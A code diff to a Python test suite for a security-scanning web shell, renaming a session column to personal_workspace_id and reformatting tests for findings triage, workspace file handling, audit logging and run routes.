-                    "SELECT data_json FROM entity_intel_snapshots WHERE session_id = ? AND entity_id = ?",
+                    "SELECT data_json FROM entity_intel_snapshots WHERE personal_workspace_id = ? AND entity_id = ?",
                     (session_id, domain_id),
                 ).fetchone()["data_json"]
             pointer = body_store.stored_body_pointer(stored)
@@ -18823,13 +19215,12 @@ class TestAtlasRoutes:
         unrelated_finding_id = "fnd_group_unrelated_" + uuid.uuid4().hex
         with db_connect() as conn:
             conn.execute(
-                "UPDATE findings SET title = 'CVE-2026-12345', "
-                "cve_ids_json = '[\"CVE-2026-12345\"]' WHERE id = ?",
+                "UPDATE findings SET title = 'CVE-2026-12345', cve_ids_json = '[\"CVE-2026-12345\"]' WHERE id = ?",
                 (finding_id,),
             )
             conn.execute(
                 "INSERT INTO findings "
-                "(id, session_id, run_id, entity_id, subject_key, signature_hash, title, "
+                "(id, personal_workspace_id, run_id, entity_id, subject_key, signature_hash, title, "
                 "origin, validation_method, cve_ids_json, created) "
                 "VALUES (?, ?, ?, ?, 'related-proof', ?, 'CVE-2026-12345 inferred', "
                 "'run', 'version_inference', '[\"CVE-2026-12345\"]', datetime('now'))",
@@ -18837,7 +19228,7 @@ class TestAtlasRoutes:
             )
             conn.execute(
                 "INSERT INTO findings "
-                "(id, session_id, run_id, entity_id, subject_key, signature_hash, title, "
+                "(id, personal_workspace_id, run_id, entity_id, subject_key, signature_hash, title, "
                 "origin, validation_method, cve_ids_json, created) "
                 "VALUES (?, ?, ?, 'ent_unrelated_review_group', 'unrelated-proof', ?, "
                 "'CVE-2026-12345 elsewhere', 'manual', 'manual_assessment', "
@@ -18897,8 +19288,10 @@ class TestAtlasRoutes:
             f"/findings/{finding_id}/triage",
             headers={"X-Session-ID": session_id},
         )
-        with mock.patch("blueprints.projects.log.debug") as triage_debug, \
-             mock.patch("blueprints.projects.log.info") as triage_info:
+        with (
+            mock.patch("blueprints.projects.log.debug") as triage_debug,
+            mock.patch("blueprints.projects.log.info") as triage_info,
+        ):
             triage_update_resp = client.put(
                 f"/findings/{finding_id}/triage",
                 json={
@@ -18909,8 +19302,10 @@ class TestAtlasRoutes:
                 },
                 headers={"X-Session-ID": session_id},
             )
-        with mock.patch("blueprints.projects.upsert_finding_triage_details", return_value=None), \
-             mock.patch("blueprints.projects.log.warning") as triage_miss_warning:
+        with (
+            mock.patch("blueprints.projects.upsert_finding_triage_details", return_value=None),
+            mock.patch("blueprints.projects.log.warning") as triage_miss_warning,
+        ):
             triage_update_miss_resp = client.put(
                 f"/findings/{finding_id}/triage",
                 json={"verification_status": "verified"},
@@ -18953,11 +19348,11 @@ class TestAtlasRoutes:
         self._seed_domain_finding_run(session_id, "explicit-not-started.darklab.test")
         with db_connect() as conn:
             no_triage_finding_id = conn.execute(
-                "SELECT id FROM findings WHERE session_id = ? AND raw_line LIKE ?",
+                "SELECT id FROM findings WHERE personal_workspace_id = ? AND raw_line LIKE ?",
                 (session_id, "%no-triage.darklab.test%"),
             ).fetchone()["id"]
             explicit_not_started_finding_id = conn.execute(
-                "SELECT id FROM findings WHERE session_id = ? AND raw_line LIKE ?",
+                "SELECT id FROM findings WHERE personal_workspace_id = ? AND raw_line LIKE ?",
                 (session_id, "%explicit-not-started.darklab.test%"),
             ).fetchone()["id"]
         explicit_not_started_resp = client.put(
@@ -18997,12 +19392,8 @@ class TestAtlasRoutes:
         assert grouped_by_id[finding_id]["review_state"] == "important"
         assert grouped_by_id[related_finding_id]["review_state"] == "important"
         assert grouped_by_id[unrelated_finding_id]["review_state"] == "new"
-        assert grouped_by_id[related_finding_id]["observation_references"][0][
-            "review_state_source"
-        ] == "remediation_group"
-        assert {
-            item["id"]: item["review_state"] for item in run_findings
-        }[related_finding_id] == "important"
+        assert grouped_by_id[related_finding_id]["observation_references"][0]["review_state_source"] == "remediation_group"
+        assert {item["id"]: item["review_state"] for item in run_findings}[related_finding_id] == "important"
         assert missing_triage_get_resp.status_code == 404
         assert json.loads(missing_triage_get_resp.data) == {"error": "finding not found"}
         assert missing_triage_put_resp.status_code == 404
@@ -19022,8 +19413,7 @@ class TestAtlasRoutes:
         assert triage_debug_extra["will_clear"] is False
         triage_info.assert_any_call("FINDING_TRIAGE_UPDATED", extra=mock.ANY)
         triage_info_call = next(
-            call for call in triage_info.call_args_list
-            if call.args and call.args[0] == "FINDING_TRIAGE_UPDATED"
+            call for call in triage_info.call_args_list if call.args and call.args[0] == "FINDING_TRIAGE_UPDATED"
         )
         triage_info_extra = triage_info_call.kwargs["extra"]
         assert triage_info_extra["finding_id"] == finding_id
@@ -19056,9 +19446,7 @@ class TestAtlasRoutes:
         assert filtered_not_started_resp.status_code == 200
         filtered_not_started = json.loads(filtered_not_started_resp.data)
         assert filtered_not_started["total"] == 2
-        filtered_not_started_by_id = {
-            item["id"]: item for item in filtered_not_started["findings"]
-        }
+        filtered_not_started_by_id = {item["id"]: item for item in filtered_not_started["findings"]}
         assert set(filtered_not_started_by_id) == {no_triage_finding_id, explicit_not_started_finding_id}
         assert filtered_not_started_by_id[no_triage_finding_id]["verification_status"] == "not_started"
         assert filtered_not_started_by_id[no_triage_finding_id]["triage"]["has_remediation"] is False
@@ -19072,7 +19460,7 @@ class TestAtlasRoutes:
         assert filtered_invalid_resp.status_code == 400
         with db_connect() as conn:
             row = conn.execute(
-                "SELECT status FROM findings WHERE session_id = ? AND id = ?",
+                "SELECT status FROM findings WHERE personal_workspace_id = ? AND id = ?",
                 (session_id, finding_id),
             ).fetchone()
             verification_audit = conn.execute(
@@ -19098,7 +19486,7 @@ class TestAtlasRoutes:
         with db_connect() as conn:
             conn.execute(
                 "INSERT INTO entities "
-                "(id, session_id, type, canonical_value, signature_hash, first_seen_at, "
+                "(id, personal_workspace_id, type, canonical_value, signature_hash, first_seen_at, "
                 "last_seen_at, occurrence_count, created) "
                 "VALUES (?, ?, 'domain', 'merged-target.darklab.test', ?, datetime('now'), "
                 "datetime('now'), 1, datetime('now'))",
@@ -19106,7 +19494,7 @@ class TestAtlasRoutes:
             )
             conn.execute(
                 "INSERT INTO findings "
-                "(id, session_id, run_id, entity_id, subject_key, signature_hash, origin, "
+                "(id, personal_workspace_id, run_id, entity_id, subject_key, signature_hash, origin, "
                 "validation_method, status, severity, title, raw_line, cve_ids_json, created) "
                 "VALUES (?, ?, ?, ?, 'merged-target.darklab.test', ?, 'manual', "
                 "'manual_assessment', 'important', 'high', 'Alternate evidence for one fix', "
@@ -19121,8 +19509,7 @@ class TestAtlasRoutes:
                 ),
             )
             before_occurrences = conn.execute(
-                "SELECT COUNT(*) AS count FROM findings_occurrences "
-                "WHERE finding_id IN (?, ?)",
+                "SELECT COUNT(*) AS count FROM findings_occurrences WHERE finding_id IN (?, ?)",
                 (source_finding_id, target_finding_id),
             ).fetchone()["count"]
             conn.commit()
@@ -19260,8 +19647,7 @@ class TestAtlasRoutes:
         }
         with db_connect() as conn:
             after_occurrences = conn.execute(
-                "SELECT COUNT(*) AS count FROM findings_occurrences "
-                "WHERE finding_id IN (?, ?)",
+                "SELECT COUNT(*) AS count FROM findings_occurrences WHERE finding_id IN (?, ?)",
                 (source_finding_id, target_finding_id),
             ).fetchone()["count"]
 
@@ -19269,9 +19655,7 @@ class TestAtlasRoutes:
         assert target_review.status_code == 200
         assert target_triage.status_code == 200
         assert candidates_resp.status_code == 200
-        assert [item["finding_id"] for item in candidates_resp.get_json()["candidates"]] == [
-            target_finding_id
-        ]
+        assert [item["finding_id"] for item in candidates_resp.get_json()["candidates"]] == [target_finding_id]
         assert preview_resp.status_code == 200
         assert preview["member_count"] == 2
         assert preview["observation_count"] == 2
@@ -19488,7 +19872,7 @@ class TestAtlasRoutes:
         project = json.loads(project_resp.data)["project"]
         with db_connect() as conn:
             conn.execute(
-                "INSERT INTO runs (id, session_id, run_kind, command, started, output_preview, output_line_count) "
+                "INSERT INTO runs (id, personal_workspace_id, run_kind, command, started, output_preview, output_line_count) "
                 "VALUES (?, ?, 'external', ?, ?, ?, 1)",
                 (run_id, session_id, "sslscan darklab.sh", "2026-05-14T00:00:00+00:00", "[]"),
             )
@@ -19499,11 +19883,18 @@ class TestAtlasRoutes:
             headers={"X-Session-ID": session_id},
         )
         with db_connect() as conn:
-            recorded = record_run_findings(conn, session_id, run_id, [{
-                "text": "TLSv1.0 enabled [high]",
-                "signals": ["findings"],
-                "line_index": 7,
-            }])
+            recorded = record_run_findings(
+                conn,
+                session_id,
+                run_id,
+                [
+                    {
+                        "text": "TLSv1.0 enabled [high]",
+                        "signals": ["findings"],
+                        "line_index": 7,
+                    }
+                ],
+            )
             conn.commit()
 
         atlas_resp = client.get("/atlas/findings?review_state=new", headers={"X-Session-ID": session_id})
@@ -19544,7 +19935,7 @@ class TestAtlasRoutes:
         assert recorded[0]["target_ids"] == []
         expected_finding_keys = {
             "id",
-            "session_id",
+            "personal_workspace_id",
             "run_id",
             "target_id",
             "entity_id",
@@ -19595,14 +19986,19 @@ class TestAtlasRoutes:
         run_id = "run-" + uuid.uuid4().hex
         with db_connect() as conn:
             conn.execute(
-                "INSERT INTO runs (id, session_id, run_kind, command, started, output_preview, output_line_count) "
+                "INSERT INTO runs (id, personal_workspace_id, run_kind, command, started, output_preview, output_line_count) "
                 "VALUES (?, ?, 'external', ?, ?, ?, 2)",
                 (run_id, session_id, "katana -u https://darklab.sh", "2026-05-14T00:00:00+00:00", "[]"),
             )
-            recorded = record_run_findings(conn, session_id, run_id, [
-                {"text": "https://darklab.sh/login [200]", "signals": ["findings"], "line_index": 0},
-                {"text": "https://darklab.sh/login [200]", "signals": ["findings"], "line_index": 9},
-            ])
+            recorded = record_run_findings(
+                conn,
+                session_id,
+                run_id,
+                [
+                    {"text": "https://darklab.sh/login [200]", "signals": ["findings"], "line_index": 0},
+                    {"text": "https://darklab.sh/login [200]", "signals": ["findings"], "line_index": 9},
+                ],
+            )
             occurrence_count = conn.execute(
                 "SELECT COUNT(*) FROM findings_occurrences WHERE run_id = ?",
                 (run_id,),
@@ -19693,7 +20089,7 @@ class TestAtlasRoutes:
         with db_connect() as conn:
             conn.execute(
                 "INSERT INTO entity_intel_snapshots "
-                "(id, session_id, entity_id, provider, status, summary, data_json, fetched_at) "
+                "(id, personal_workspace_id, entity_id, provider, status, summary, data_json, fetched_at) "
                 "VALUES (?, ?, ?, 'nvd', 'ok', 'data available', ?, datetime('now'))",
                 (
                     "intel_" + uuid.uuid4().hex,
@@ -19719,8 +20115,10 @@ class TestAtlasRoutes:
             f"/projects/{project['id']}/summary",
             headers={"X-Session-ID": session_id},
         )
-        with mock.patch.object(project_routes.log, "debug") as debug_log, \
-             mock.patch.object(project_routes.log, "warning") as warning_log:
+        with (
+            mock.patch.object(project_routes.log, "debug") as debug_log,
+            mock.patch.object(project_routes.log, "warning") as warning_log,
+        ):
             entities_resp = client.get(
                 f"/projects/{project['id']}/entities?type=cve&limit=1&offset=0",
                 headers={"X-Session-ID": session_id},
@@ -19777,9 +20175,9 @@ class TestAtlasRoutes:
         assert target_filtered["counts_by_type"] == {"cve": 1, "domain": 1}
         assert host_filtered["entities"] == []
         host_viewed = next(
-            call for call in debug_log.call_args_list
-            if call.args == ("PROJECT_ENTITIES_VIEWED",)
-            and call.kwargs["extra"]["host_filter_count"] == 1
+            call
+            for call in debug_log.call_args_list
+            if call.args == ("PROJECT_ENTITIES_VIEWED",) and call.kwargs["extra"]["host_filter_count"] == 1
         )
         assert host_viewed.kwargs["extra"] == {
             "ip": mock.ANY,
@@ -19906,17 +20304,19 @@ class TestAtlasRoutes:
                 conn,
                 session_id,
                 run_id,
-                [{
-                    "text": "443/tcp open https nginx on darklab.sh",
-                    "entities": [
-                        {"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"},
-                        {
-                            "type": "port",
-                            "value": "darklab.sh:443/tcp",
-                            "attributes": {"service": "https", "version": "nginx"},
-                        },
-                    ],
-                }],
+                [
+                    {
+                        "text": "443/tcp open https nginx on darklab.sh",
+                        "entities": [
+                            {"type": "domain", "value": "darklab.sh", "canonical_value": "darklab.sh"},
+                            {
+                                "type": "port",
+                                "value": "darklab.sh:443/tcp",
+                                "attributes": {"service": "https", "version": "nginx"},
+                            },
+                        ],
+                    }
+                ],
                 seen_at="2026-05-14T00:00:02+00:00",
                 command="nmap darklab.sh",
             )
@@ -19945,19 +20345,19 @@ class TestAtlasRoutes:
             ):
                 conn.execute(
                     "INSERT INTO entity_labels "
-                    "(id, session_id, entity_type, entity_id, label, created) "
+                    "(id, personal_workspace_id, entity_type, entity_id, label, created) "
                     "VALUES (?, ?, 'atlas_entity', ?, ?, datetime('now'))",
                     ("lbl_" + uuid.uuid4().hex, session_id, entity_id, label),
                 )
                 conn.execute(
                     "INSERT INTO entity_notes "
-                    "(id, session_id, entity_type, entity_id, body, created, updated) "
+                    "(id, personal_workspace_id, entity_type, entity_id, body, created, updated) "
                     "VALUES (?, ?, 'atlas_entity', ?, ?, datetime('now'), datetime('now'))",
                     ("note_" + uuid.uuid4().hex, session_id, entity_id, note),
                 )
             conn.execute(
                 "INSERT INTO entity_intel_snapshots "
-                "(id, session_id, entity_id, provider, status, summary, data_json, fetched_at) "
+                "(id, personal_workspace_id, entity_id, provider, status, summary, data_json, fetched_at) "
                 "VALUES (?, ?, ?, 'crtsh', 'ok', 'data available', ?, datetime('now'))",
                 (
                     "intel_" + uuid.uuid4().hex,
@@ -20036,6 +20436,7 @@ class TestAtlasRoutes:
 
 # ── /workspace/files ──────────────────────────────────────────────────────────
 
+
 class TestWorkspaceRoutes:
     def _cfg(self, root, **overrides):
         cfg = {
@@ -20059,11 +20460,14 @@ class TestWorkspaceRoutes:
 
     def test_disabled_workspace_returns_403(self):
         client = get_client()
-        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(
-            config.CFG,
-            self._cfg(tmp, workspace_enabled=False),
+        with (
+            tempfile.TemporaryDirectory() as tmp,
+            mock.patch.dict(
+                config.CFG,
+                self._cfg(tmp, workspace_enabled=False),
+            ),
         ):
-            resp = client.get("/workspace/files", headers={"X-Session-ID": anonymous_session_id('workspace-disabled')})
+            resp = client.get("/workspace/files", headers={"X-Session-ID": anonymous_session_id("workspace-disabled")})
         assert resp.status_code == 403
         assert json.loads(resp.data)["error"] == "Files are disabled on this instance"
 
@@ -20183,10 +20587,13 @@ class TestWorkspaceRoutes:
                     return False
 
             best_effort_path = f"{session}-audit-failure.txt"
-            with mock.patch(
-                "services.audit.recorder._managed_connection",
-                side_effect=ManagedAuditFailure,
-            ), mock.patch("services.audit.recorder.log.warning") as warning:
+            with (
+                mock.patch(
+                    "services.audit.recorder._managed_connection",
+                    side_effect=ManagedAuditFailure,
+                ),
+                mock.patch("services.audit.recorder.log.warning") as warning,
+            ):
                 best_effort_write = client.post(
                     "/workspace/files",
                     headers={"X-Session-ID": session},
@@ -20232,10 +20639,13 @@ class TestWorkspaceRoutes:
             )
             assert created.status_code == 200
 
-            with mock.patch(
-                "blueprints.workspace.record_event",
-                side_effect=AuditRecordError("audit unavailable"),
-            ), pytest.raises(AuditRecordError):
+            with (
+                mock.patch(
+                    "blueprints.workspace.record_event",
+                    side_effect=AuditRecordError("audit unavailable"),
+                ),
+                pytest.raises(AuditRecordError),
+            ):
                 client.delete(
                     f"/workspace/files?path={file_path}",
                     headers={"X-Session-ID": session},
@@ -20254,14 +20664,14 @@ class TestWorkspaceRoutes:
         with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
             resp = client.post(
                 "/workspace/files",
-                headers={"X-Session-ID": anonymous_session_id('workspace-owner')},
+                headers={"X-Session-ID": anonymous_session_id("workspace-owner")},
                 json={"path": "targets.txt", "text": "owned\n"},
             )
             assert resp.status_code == 200
 
             other = client.get(
                 "/workspace/files/read?path=targets.txt",
-                headers={"X-Session-ID": anonymous_session_id('workspace-other')},
+                headers={"X-Session-ID": anonymous_session_id("workspace-other")},
             )
             assert other.status_code == 404
 
@@ -20371,13 +20781,9 @@ class TestWorkspaceRoutes:
             )
 
         assert byte_limited.status_code == 413
-        assert byte_limited.get_json()["error"] == (
-            "file:too-many-bytes.txt exceeds the file diff limit of 500,000 bytes"
-        )
+        assert byte_limited.get_json()["error"] == ("file:too-many-bytes.txt exceeds the file diff limit of 500,000 bytes")
         assert line_limited.status_code == 413
-        assert line_limited.get_json()["error"] == (
-            "file:too-many-lines.txt exceeds the file diff limit of 5,000 lines"
-        )
+        assert line_limited.get_json()["error"] == ("file:too-many-lines.txt exceeds the file diff limit of 5,000 lines")
 
     def test_workspace_diff_compares_files_runs_and_the_last_two_tab_runs(self):
         client = get_client()
@@ -20396,31 +20802,43 @@ class TestWorkspaceRoutes:
             with sqlite3.connect(DB_PATH) as conn:
                 conn.execute(
                     "INSERT INTO runs "
-                    "(id, session_id, owner_tab_id, command, started, finished, exit_code, output_preview) "
+                    "(id, personal_workspace_id, owner_tab_id, command, started, finished, exit_code, output_preview) "
                     "VALUES (?, ?, ?, ?, ?, ?, 0, ?)",
                     (
-                        run_ids[0], session, tab_id, "printf alpha beta",
-                        "2026-07-19T01:00:00+00:00", "2026-07-19T01:00:01+00:00",
+                        run_ids[0],
+                        session,
+                        tab_id,
+                        "printf alpha beta",
+                        "2026-07-19T01:00:00+00:00",
+                        "2026-07-19T01:00:01+00:00",
                         json.dumps(["alpha", "beta"]),
                     ),
                 )
                 conn.execute(
                     "INSERT INTO runs "
-                    "(id, session_id, owner_tab_id, command, started, finished, exit_code, output_preview) "
+                    "(id, personal_workspace_id, owner_tab_id, command, started, finished, exit_code, output_preview) "
                     "VALUES (?, ?, ?, ?, ?, ?, 0, ?)",
                     (
-                        run_ids[1], session, tab_id, "printf alpha delta",
-                        "2026-07-19T01:01:00+00:00", "2026-07-19T01:01:01+00:00",
+                        run_ids[1],
+                        session,
+                        tab_id,
+                        "printf alpha delta",
+                        "2026-07-19T01:01:00+00:00",
+                        "2026-07-19T01:01:01+00:00",
                         json.dumps(["alpha", "delta"]),
                     ),
                 )
                 conn.execute(
                     "INSERT INTO runs "
-                    "(id, session_id, owner_tab_id, command, started, finished, exit_code, output_preview) "
+                    "(id, personal_workspace_id, owner_tab_id, command, started, finished, exit_code, output_preview) "
                     "VALUES (?, ?, ?, ?, ?, ?, 0, ?)",
                     (
-                        run_ids[2], other_session, tab_id, "printf private",
-                        "2026-07-19T01:02:00+00:00", "2026-07-19T01:02:01+00:00",
+                        run_ids[2],
+                        other_session,
+                        tab_id,
+                        "printf private",
+                        "2026-07-19T01:02:00+00:00",
+                        "2026-07-19T01:02:01+00:00",
                         json.dumps(["private"]),
                     ),
                 )
@@ -20475,13 +20893,13 @@ class TestWorkspaceRoutes:
             with sqlite3.connect(DB_PATH) as conn:
                 conn.execute(
                     "INSERT INTO entity_labels "
-                    "(id, session_id, entity_type, entity_id, label, created) "
+                    "(id, personal_workspace_id, entity_type, entity_id, label, created) "
                     "VALUES (?, ?, 'workspace_file', 'targets.txt', 'important', datetime('now'))",
                     ("lbl_workspace_file_" + uuid.uuid4().hex, session),
                 )
                 conn.execute(
                     "INSERT INTO entity_notes "
-                    "(id, session_id, entity_type, entity_id, body, created, updated) "
+                    "(id, personal_workspace_id, entity_type, entity_id, body, created, updated) "
                     "VALUES (?, ?, 'workspace_file', 'targets.txt', 'manual context', datetime('now'), datetime('now'))",
                     ("note_workspace_file_" + uuid.uuid4().hex, session),
                 )
@@ -20515,17 +20933,23 @@ class TestWorkspaceRoutes:
             )
             assert moved.status_code == 200
             with sqlite3.connect(DB_PATH) as conn:
-                assert conn.execute(
-                    "SELECT COUNT(*) FROM entity_labels "
-                    "WHERE session_id = ? AND entity_type = 'workspace_file' AND entity_id = 'targets.txt'",
-                    (session,),
-                ).fetchone()[0] == 0
-                assert conn.execute(
-                    "SELECT body FROM entity_notes "
-                    "WHERE session_id = ? AND entity_type = 'workspace_file' "
-                    "AND entity_id = 'reports/targets.txt'",
-                    (session,),
-                ).fetchone()[0] == "manual context"
+                assert (
+                    conn.execute(
+                        "SELECT COUNT(*) FROM entity_labels "
+                        "WHERE personal_workspace_id = ? AND entity_type = 'workspace_file' AND entity_id = 'targets.txt'",
+                        (session,),
+                    ).fetchone()[0]
+                    == 0
+                )
+                assert (
+                    conn.execute(
+                        "SELECT body FROM entity_notes "
+                        "WHERE personal_workspace_id = ? AND entity_type = 'workspace_file' "
+                        "AND entity_id = 'reports/targets.txt'",
+                        (session,),
+                    ).fetchone()[0]
+                    == "manual context"
+                )
 
             deleted = client.delete(
                 "/workspace/files?path=reports/targets.txt",
@@ -20533,16 +20957,20 @@ class TestWorkspaceRoutes:
             )
             assert deleted.status_code == 200
             with sqlite3.connect(DB_PATH) as conn:
-                assert conn.execute(
-                    "SELECT COUNT(*) FROM entity_labels "
-                    "WHERE session_id = ? AND entity_type = 'workspace_file'",
-                    (session,),
-                ).fetchone()[0] == 0
-                assert conn.execute(
-                    "SELECT COUNT(*) FROM entity_notes "
-                    "WHERE session_id = ? AND entity_type = 'workspace_file'",
-                    (session,),
-                ).fetchone()[0] == 0
+                assert (
+                    conn.execute(
+                        "SELECT COUNT(*) FROM entity_labels WHERE personal_workspace_id = ? AND entity_type = 'workspace_file'",
+                        (session,),
+                    ).fetchone()[0]
+                    == 0
+                )
+                assert (
+                    conn.execute(
+                        "SELECT COUNT(*) FROM entity_notes WHERE personal_workspace_id = ? AND entity_type = 'workspace_file'",
+                        (session,),
+                    ).fetchone()[0]
+                    == 0
+                )
 
     def test_create_directory_lists_empty_folder(self):
         client = get_client()
@@ -20645,14 +21073,20 @@ class TestWorkspaceRoutes:
                 "kind": "file",
                 "file_count": 1,
             }
-            assert client.get(
-                f"/workspace/files/read?path={one_path}",
-                headers={"X-Session-ID": session},
-            ).status_code == 404
-            assert client.get(
-                f"/workspace/files/read?path={moved_one_path}",
-                headers={"X-Session-ID": session},
-            ).get_json()["text"] == "one\n"
+            assert (
+                client.get(
+                    f"/workspace/files/read?path={one_path}",
+                    headers={"X-Session-ID": session},
+                ).status_code
+                == 404
+            )
+            assert (
+                client.get(
+                    f"/workspace/files/read?path={moved_one_path}",
+                    headers={"X-Session-ID": session},
+                ).get_json()["text"]
+                == "one\n"
+            )
             file_move_audit = _audit_event_rows(target_id=moved_one_path, event_type="file.move")
             assert len(file_move_audit) == 1
             assert file_move_audit[0]["details"] == {
@@ -20704,16 +21138,22 @@ class TestWorkspaceRoutes:
         session = anonymous_session_id("workspace-copy-touch-" + uuid.uuid4().hex[:8])
         headers = {"X-Session-ID": session}
         with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
-            assert client.post(
-                "/workspace/files",
-                headers=headers,
-                json={"path": "source.txt", "text": "source\n"},
-            ).status_code == 200
-            assert client.post(
-                "/workspace/directories",
-                headers=headers,
-                json={"path": "archive"},
-            ).status_code == 200
+            assert (
+                client.post(
+                    "/workspace/files",
+                    headers=headers,
+                    json={"path": "source.txt", "text": "source\n"},
+                ).status_code
+                == 200
+            )
+            assert (
+                client.post(
+                    "/workspace/directories",
+                    headers=headers,
+                    json={"path": "archive"},
+                ).status_code
+                == 200
+            )
 
             copied = client.post(
                 "/workspace/files/copy",
@@ -20742,10 +21182,13 @@ class TestWorkspaceRoutes:
                 "destination": "archive/source.txt",
                 "size": len("source\n"),
             }
-            assert client.get(
-                "/workspace/files/read?path=archive/source.txt",
-                headers=headers,
-            ).get_json()["text"] == "source\n"
+            assert (
+                client.get(
+                    "/workspace/files/read?path=archive/source.txt",
+                    headers=headers,
+                ).get_json()["text"]
+                == "source\n"
+            )
             assert created.status_code == 200
             assert created.get_json()["file"] == {
                 "path": "empty.txt",
@@ -20866,9 +21309,12 @@ class TestWorkspaceRoutes:
     def test_enforces_quota_and_type_checks(self):
         client = get_client()
         session = anonymous_session_id("workspace-quota-" + uuid.uuid4().hex[:8])
-        with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(
-            config.CFG,
-            self._cfg(tmp, workspace_quota_mb=0, workspace_max_file_mb=0, workspace_max_files=1),
+        with (
+            tempfile.TemporaryDirectory() as tmp,
+            mock.patch.dict(
+                config.CFG,
+                self._cfg(tmp, workspace_quota_mb=0, workspace_max_file_mb=0, workspace_max_files=1),
+            ),
         ):
             non_object = client.post(
                 "/workspace/files",
@@ -20935,12 +21381,12 @@ class TestWorkspaceRoutes:
             )
             with sqlite3.connect(DB_PATH) as conn:
                 conn.execute(
-                    "INSERT INTO runs (id, session_id, command, started) VALUES (?, ?, 'cat reports/targets.txt', ?)",
+                    "INSERT INTO runs (id, personal_workspace_id, command, started) VALUES (?, ?, 'cat reports/targets.txt', ?)",
                     (run_id, session, datetime.now(timezone.utc).isoformat()),
                 )
                 conn.execute(
                     "INSERT INTO projects "
-                    "(id, session_id, name, slug, description, status, color, created, updated) "
+                    "(id, personal_workspace_id, name, slug, description, status, color, created, updated) "
                     "VALUES (?, ?, 'Artifact Case', ?, '', 'active', '', datetime('now'), datetime('now'))",
                     (project_id, session, f"artifact-case-{uuid.uuid4().hex[:8]}"),
                 )
@@ -20951,7 +21397,7 @@ class TestWorkspaceRoutes:
                 )
                 conn.execute(
                     "INSERT INTO run_file_artifacts "
-                    "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
+                    "(id, personal_workspace_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                     "VALUES (?, ?, ?, 'reports/targets.txt', 'targets.txt', 'output', 11, 'workspace_flag', "
                     "datetime('now'))",
                     ("rfa_" + uuid.uuid4().hex[:16], session, run_id),
@@ -20971,6 +21417,7 @@ class TestWorkspaceRoutes:
             shell_app_module._last_workspace_cleanup_monotonic = 0
             with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
                 from services.workspace.files import ensure_session_workspace
+
                 expired_root = ensure_session_workspace(
                     anonymous_session_id("expired-session"),
                     config.CFG,
@@ -20992,6 +21439,7 @@ class TestWorkspaceRoutes:
             shell_app_module._last_workspace_cleanup_monotonic = 0
             with tempfile.TemporaryDirectory() as tmp, mock.patch.dict(config.CFG, self._cfg(tmp)):
                 from services.workspace.files import ensure_session_workspace
+
                 current_session = anonymous_session_id("active-session")
                 expired_session = anonymous_session_id("expired-session")
                 current_root = ensure_session_workspace(current_session, config.CFG)
@@ -21017,25 +21465,31 @@ class TestWorkspaceRoutes:
         fake_conn.execute.return_value.fetchone.return_value = (0, 12, 12)
         try:
             shell_app_module._last_sqlite_wal_checkpoint_monotonic = 0
-            with mock.patch.object(database, "DB_BACKEND", DatabaseBackend.SQLITE), \
-                 mock.patch.object(database, "db_connect", return_value=fake_conn) as connect_db, \
-                 mock.patch.object(shell_app_module, "_sqlite_wal_checkpoint_monotonic", return_value=1000), \
-                 mock.patch.object(shell_app_module.log, "info") as log_info:
+            with (
+                mock.patch.object(database, "DB_BACKEND", DatabaseBackend.SQLITE),
+                mock.patch.object(database, "db_connect", return_value=fake_conn) as connect_db,
+                mock.patch.object(shell_app_module, "_sqlite_wal_checkpoint_monotonic", return_value=1000),
+                mock.patch.object(shell_app_module.log, "info") as log_info,
+            ):
                 resp = client.get("/health")
 
             assert resp.status_code == 200
             connect_db.assert_called()
             fake_conn.execute.assert_any_call("PRAGMA wal_checkpoint(TRUNCATE)")
-            log_info.assert_any_call("SQLITE_WAL_CHECKPOINT", extra={
-                "busy": 0,
-                "log_frames": 12,
-                "checkpointed_frames": 12,
-            })
+            log_info.assert_any_call(
+                "SQLITE_WAL_CHECKPOINT",
+                extra={
+                    "busy": 0,
+                    "log_frames": 12,
+                    "checkpointed_frames": 12,
+                },
+            )
         finally:
             shell_app_module._last_sqlite_wal_checkpoint_monotonic = previous_checkpoint
 
 
 # ── /runs ─────────────────────────────────────────────────────────────────────
+
 
 class TestRunRoute:
     def test_workspace_path_output_filter_masks_absolute_session_paths(self):
@@ -21047,9 +21501,7 @@ class TestRunRoute:
             workspace_path = workspace_files.session_workspace_dir(session, cfg)
             output_filter = _WorkspacePathOutputFilter(session, cfg)
 
-            filtered = output_filter.process_output_line(
-                f"wrote {workspace_path}/reports/nmap.xml and {workspace_path}"
-            )
+            filtered = output_filter.process_output_line(f"wrote {workspace_path}/reports/nmap.xml and {workspace_path}")
 
         assert filtered == "wrote /reports/nmap.xml and /"
 
@@ -21060,9 +21512,11 @@ class TestRunRoute:
 
         client = get_client()
         headers = {"X-Session-ID": anonymous_session_id("broker-unavailable")}
-        with mock.patch.object(shell_app_module.log, "warning") as warning, \
-             mock.patch("blueprints.run.broker_available", return_value=False), \
-             mock.patch("blueprints.run.broker_unavailable_reason", return_value="broker unavailable"):
+        with (
+            mock.patch.object(shell_app_module.log, "warning") as warning,
+            mock.patch("blueprints.run.broker_available", return_value=False),
+            mock.patch("blueprints.run.broker_unavailable_reason", return_value="broker unavailable"),
+        ):
             resp = client.post("/runs", json={"command": "echo hi"}, headers=headers)
         assert resp.status_code == 503
         assert json.loads(resp.data)["error"] == "broker unavailable"
@@ -21120,16 +21574,18 @@ class TestRunRoute:
 
     def test_brokered_run_missing_runtime_returns_synthetic_stream_reference(self):
         client = get_client()
-        with mock.patch("blueprints.run.broker_available", return_value=True), \
-             mock.patch("blueprints.run.is_command_allowed", return_value=(True, "")), \
-             mock.patch("blueprints.run.rewrite_command", return_value=("nmap -sV darklab.sh", None)), \
-             mock.patch("blueprints.run.runtime_missing_command_name", return_value="nmap"), \
-             mock.patch("blueprints.run._brokered_synthetic_run", return_value="run-missing") as synthetic, \
-             mock.patch("blueprints.run.subprocess.Popen") as popen:
+        with (
+            mock.patch("blueprints.run.broker_available", return_value=True),
+            mock.patch("blueprints.run.is_command_allowed", return_value=(True, "")),
+            mock.patch("blueprints.run.rewrite_command", return_value=("nmap -sV darklab.sh", None)),
